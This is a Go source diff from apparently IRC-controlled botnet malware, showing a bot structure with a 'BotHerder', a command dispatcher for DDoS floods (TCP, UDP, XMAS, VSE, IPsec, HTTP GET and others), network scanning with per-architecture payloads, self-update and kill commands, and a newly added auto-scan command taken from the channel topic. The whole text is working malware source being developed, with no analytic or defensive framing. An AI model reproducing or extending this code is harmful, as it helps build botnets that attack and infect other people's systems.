@@ -8,21 +8,22 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-var BotReader *string
+var BotReader, TopicReader *string
+var ChannelTopic []string //Just for a merge process.
 
 /*
-	These 2 values doesn't merge with bot structure because of a "fileName" function,
+	These 2 varibles doesn't merge with bot structure because of a "fileName" function,
 	i want it to be a global function that every structure can access.
 */
 var BotGroup, BotID string
 
 type Bot struct {
 	CPU                   int
-	mipsArch, defaultArch string
+	MipsArch, DefaultArch string
 	password, network     string
 	Channel, ChanKey      string
 	BotTag, BotHerder     string
-	scanOpt, scanOptFull  string
+	ScanOpt, scanOptFull  string
 	tempIP                string
 	scanNetwork           []string
 	isRandom, scanSwitch  bool
@@ -103,7 +104,7 @@ var TCPAttackMap = map[string]Attack{
 }
 
 /*
-	Blacklist IP that will be skip in random scanning process. Skip since first network ID.
+        Blacklist IP that will be skip in random scanning process. Skip since first network ID.
 	Some of these first network ID may be anything not mentionally to be the thing that i have commented because i skip since first network ID.
 	I don't recommend you to write map like this in Go, i do this because you know...
 	In my opinion it's look cleaner than using if statement with "or" operator for these bunch of Blacklist IPs.
@@ -221,7 +222,7 @@ var BlacklistIPs = map[string]struct{}{
 func SetupCaller() (Caller, bool) {
 	if Find(*BotReader, "?tcp") {
 		var CALL_5_ARG = map[string]Caller{
-			setupComd(3, ":"): {
+			SetupComd(3, ":"): {
 				CallAttack: &Attack{
 					flags:        Recv(*BotReader, 4),
 					srcAddr:      Recv(*BotReader, 5),
@@ -233,11 +234,11 @@ func SetupCaller() (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_5_ARG[setupComd(3, ":")]
+		value, key := CALL_5_ARG[SetupComd(3, ":")]
 		return value, key
 	} else if Find(*BotReader, "?udp") || Find(*BotReader, "?saf") || Find(*BotReader, "?xmas") {
 		var CALL_4_ARG = map[string]Caller{
-			setupComd(3, ":"): {
+			SetupComd(3, ":"): {
 				CallAttack: &Attack{
 					srcAddr:      Recv(*BotReader, 4),
 					dstAddr:      Recv(*BotReader, 5),
@@ -248,24 +249,24 @@ func SetupCaller() (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_4_ARG[setupComd(3, ":")]
+		value, key := CALL_4_ARG[SetupComd(3, ":")]
 		return value, key
 	} else if Find(*BotReader, "?scan") {
 		var CALL_3_ARG = map[string]Caller{
-			setupComd(3, ":"): {
+			SetupComd(3, ":"): {
 				CallBot: &Bot{
-					scanOpt:     Recv(*BotReader, 4),
-					defaultArch: Recv(*BotReader, 5),
-					mipsArch:    Recv(*BotReader, 6),
+					ScanOpt:     Recv(*BotReader, 4),
+					DefaultArch: Recv(*BotReader, 5),
+					MipsArch:    Recv(*BotReader, 6),
 					scanSwitch:  false,
 				},
 			},
 		}
-		value, key := CALL_3_ARG[setupComd(3, ":")]
+		value, key := CALL_3_ARG[SetupComd(3, ":")]
 		return value, key
 	} else if Find(*BotReader, "?vse") || Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") || Find(*BotReader, "?update") {
 		var CALL_2_ARG = map[string]Caller{
-			setupComd(3, ":"): {
+			SetupComd(3, ":"): {
 				CallAttack: &Attack{
 					srcAddr:      Recv(*BotReader, 4),
 					dstAddr:      Recv(*BotReader, 5),
@@ -275,16 +276,16 @@ func SetupCaller() (Caller, bool) {
 			},
 			"?update": {
 				CallBot: &Bot{
-					defaultArch: Recv(*BotReader, 4),
-					mipsArch:    Recv(*BotReader, 5),
+					DefaultArch: Recv(*BotReader, 4),
+					MipsArch:    Recv(*BotReader, 5),
 				},
 			},
 		}
-		value, key := CALL_2_ARG[setupComd(3, ":")]
+		value, key := CALL_2_ARG[SetupComd(3, ":")]
 		return value, key
 	} else if Find(*BotReader, "?poling") || Find(*BotReader, "?jumbo") || Find(*BotReader, "?get") {
 		var CALL_1_ARG = map[string]Caller{
-			setupComd(3, ":"): {
+			SetupComd(3, ":"): {
 				CallAttack: &Attack{
 					url:          Recv(*BotReader, 4),
 					attackSwitch: false,
@@ -292,11 +293,11 @@ func SetupCaller() (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_1_ARG[setupComd(3, ":")]
+		value, key := CALL_1_ARG[SetupComd(3, ":")]
 		return value, key
 	} else if Find(*BotReader, "?info") || Find(*BotReader, "?kill") || Find(*BotReader, "?stopddos") || Find(*BotReader, "?stopscan") {
 		var CALL_NON_ARG = map[string]Caller{
-			setupComd(3, ":"): {
+			SetupComd(3, ":"): {
 				CallBot: &Bot{},
 			},
 			"?stopddos": {
@@ -311,7 +312,28 @@ func SetupCaller() (Caller, bool) {
 				},
 			},
 		}
-		value, key := CALL_NON_ARG[setupComd(3, ":")]
+		value, key := CALL_NON_ARG[SetupComd(3, ":")]
+		return value, key
+	}
+
+	/*
+		Specific statement for an auto scanning only!!!
+
+		Find a match command from a topic reciever (a pointer value).
+		Setting up a map key with a self-value.
+	*/
+	if Find(Recv(*TopicReader, 0), "?autoscan") {
+		var CALL_TOPIC_IRC = map[string]Caller{
+			"?autoscan": {
+				CallBot: &Bot{
+					ScanOpt:     Recv(*TopicReader, 1),
+					DefaultArch: Recv(*TopicReader, 2),
+					MipsArch:    Recv(*TopicReader, 3),
+					scanSwitch:  false,
+				},
+			},
+		}
+		value, key := CALL_TOPIC_IRC["?autoscan"]
 		return value, key
 	}
 	return Caller{}, false
@@ -330,13 +352,14 @@ func (b *Bot) ExecuteCaller() (func(), bool) {
 		"?jumbo":    b.JUMBO,
 		"?get":      b.GET,
 		"?scan":     b.Scanner,
+		"?autoscan": b.Scanner,
 		"?update":   b.Update,
 		"?info":     b.Information,
 		"?kill":     Kill,
 		"?stopddos": setAttackSwitch,
 		"?stopscan": setScanSwitch,
 	}
-	value, key := executesCallMap[setupComd(3, ":")]
+	value, key := executesCallMap[SetupComd(3, ":")]
 	return value, key
 }
 
